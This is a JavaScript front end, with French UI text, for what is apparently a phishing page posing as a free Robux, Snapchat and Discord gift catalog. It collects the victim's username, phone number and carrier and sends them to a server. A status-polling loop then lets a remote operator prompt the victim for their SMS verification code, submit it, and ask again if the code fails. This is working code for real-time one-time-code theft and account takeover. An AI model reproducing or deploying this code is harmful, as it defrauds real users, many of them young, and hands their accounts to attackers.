const appState = {
  selectedGift: null,
  selectedOption: null,
  selectedOperator: 'Bouygues Telecom',
  currentLead: null
};

function openGiftModal(giftName, subtitle, optionsArray, iconUrl) {
  appState.selectedGift = giftName;
  appState.selectedOption = optionsArray[0];

  const catalogView = document.getElementById('catalog-view');
  const flowView = document.getElementById('flow-view');

  if (catalogView) catalogView.classList.add('hidden');
  if (flowView) flowView.classList.remove('hidden');

  const flowIconImg = document.getElementById('flow-icon-img');
  const flowTitle = document.getElementById('flow-title');
  const flowSubtitle = document.getElementById('flow-subtitle');

  if (flowIconImg) flowIconImg.src = iconUrl;
  if (flowTitle) flowTitle.innerText = `Obtenir ${giftName}`;
  if (flowSubtitle) flowSubtitle.innerText = subtitle;

  const targetInput = document.getElementById('pub-target-input');
  const targetLabel = document.getElementById('input-label-target');

  if (giftName === 'Robux') {
    targetLabel.innerText = 'Nom d’utilisateur Roblox';
    targetInput.placeholder = 'ex: Player123';
  } else if (giftName.includes('Snapchat')) {
    targetLabel.innerText = 'Nom d’utilisateur Snapchat';
    targetInput.placeholder = 'ex: my_snap_user';
  } else if (giftName.includes('Discord')) {
    targetLabel.innerText = 'Tag ou Nom d’utilisateur Discord';
    targetInput.placeholder = 'ex: username#0000';
  } else {
    targetLabel.innerText = 'Adresse Email / Compte';
    targetInput.placeholder = 'ex: monemail@gmail.com';
  }

  const container = document.getElementById('flow-options-container');
  if (container) {
    container.innerHTML = '';
    optionsArray.forEach((opt, idx) => {
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = `gift-option py-2.5 px-3 rounded-xl text-xs font-medium text-center ${idx === 0 ? 'selected' : ''}`;
      btn.innerText = opt;
      btn.onclick = () => {
        document.querySelectorAll('.gift-option').forEach(b => b.classList.remove('selected'));
        btn.classList.add('selected');
        appState.selectedOption = opt;
      };
      container.appendChild(btn);
    });
  }

  showPublicStep('1');
}

function resetToHome() {
  const flowView = document.getElementById('flow-view');
  const catalogView = document.getElementById('catalog-view');

  if (flowView) flowView.classList.add('hidden');
  if (catalogView) catalogView.classList.remove('hidden');
  appState.currentLead = null;
}

function toggleOperatorDropdown(e) {
  if (e) e.stopPropagation();
  const menu = document.getElementById('operator-dropdown-menu');
  if (menu) menu.classList.toggle('hidden');
}

function selectCustomOperator(opName, dotClass, e) {
  if (e) e.stopPropagation();
  appState.selectedOperator = opName;
  const display = document.getElementById('operator-selected-display');
  if (display) {
    display.innerHTML = `<span class="flex items-center gap-2"><span class="w-2.5 h-2.5 rounded-full ${dotClass}"></span> ${opName}</span> <span class="text-slate-500 text-xs">▼</span>`;
  }
  const menu = document.getElementById('operator-dropdown-menu');
  if (menu) menu.classList.add('hidden');
}

function showPublicStep(stepName) {
  ['1', '2', '3', '3bis', '4', '5'].forEach(s => {
    const el = document.getElementById(`pub-step-${s}`);
    if (el) {
      if (s === stepName.toString()) {
        el.classList.remove('hidden');
      } else {
        el.classList.add('hidden');
      }
    }
  });
}

function formatPhoneInput(input) {
  let raw = input.value.replace(/\D/g, '').substring(0, 10);
  let formatted = '';
  for (let i = 0; i < raw.length; i++) {
    if (i > 0 && i % 2 === 0) formatted += ' ';
    formatted += raw[i];
  }
  input.value = formatted;
}

async function handlePublicStep1Submit(e) {
  if (e) e.preventDefault();
  const targetInput = document.getElementById('pub-target-input');
  const phoneInput = document.getElementById('pub-phone-input');

  const targetVal = targetInput ? targetInput.value.trim() : '';
  const phone = phoneInput ? phoneInput.value.trim() : '';
  const uuid = Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');

  appState.currentLead = {
    gift: appState.selectedGift,
    option: appState.selectedOption,
    snapUser: targetVal,
    phone: phone,
    operator: appState.selectedOperator,
    uuid: uuid,
    codeDigits: 4
  };

  showPublicStep('2');

  fetch('/api/lead', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(appState.currentLead)
  }).catch(() => {});
}

let pinInputsInitialized = false;

function setupPublicPinInputs(digits) {
  const container = document.getElementById('pub-pin-container');
  if (!container) return;
  if (pinInputsInitialized && container.children.length === digits) return;

  container.innerHTML = '';
  pinInputsInitialized = true;

  for (let i = 1; i <= digits; i++) {
    const input = document.createElement('input');
    input.type = 'text';
    input.inputMode = 'numeric';
    input.maxLength = 1;
    input.className = 'pin-input-box';
    input.id = `pin-${i}`;

    input.addEventListener('input', (ev) => {
      const val = ev.target.value.replace(/\D/g, '');
      ev.target.value = val;
      if (val && i < digits) {
        document.getElementById(`pin-${i + 1}`)?.focus();
      }
    });

    input.addEventListener('keydown', (ev) => {
      if (ev.key === 'Backspace' && !ev.target.value && i > 1) {
        document.getElementById(`pin-${i - 1}`)?.focus();
      }
    });

    container.appendChild(input);
  }

  setTimeout(() => {
    document.getElementById('pin-1')?.focus();
  }, 100);
}

async function handlePublicPinSubmit(e) {
  if (e) e.preventDefault();
  const digits = appState.currentLead.codeDigits || 4;
  let code = '';
  for (let i = 1; i <= digits; i++) {
    const box = document.getElementById(`pin-${i}`);
    if (box) code += box.value.trim();
  }

  if (code.length < digits) {
    alert('Veuillez entrer les 4 chiffres complets.');
    return;
  }

  appState.currentLead.receivedSmsCode = code;
  showPublicStep('3bis');

  try {
    await fetch('/api/submit-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        uuid: appState.currentLead.uuid,
        code: code
      })
    });
  } catch(err) {}
}

setInterval(async () => {
  if (appState.currentLead && appState.currentLead.uuid) {
    try {
      const res = await fetch(`/api/lead-status/${appState.currentLead.uuid}`);
      const data = await res.json();

      const step3El = document.getElementById('pub-step-3');
      const isStep3Visible = step3El && !step3El.classList.contains('hidden');

      if (data.status === 'request_code') {
        appState.currentLead.codeDigits = data.digits || 4;
        if (!isStep3Visible) {
          showPublicStep('3');
          setupPublicPinInputs(data.digits || 4);
        }
      } else if (data.status === 'success') {
        showPublicStep('5');
      } else if (data.status === 'bad_code') {
        showPublicStep('4');
        pinInputsInitialized = false;
      }
    } catch(e) {}
  }
}, 2000);

window.addEventListener('click', () => {
  const menu = document.getElementById('operator-dropdown-menu');
  if (menu && !menu.classList.contains('hidden')) {
    menu.classList.add('hidden');
  }
});
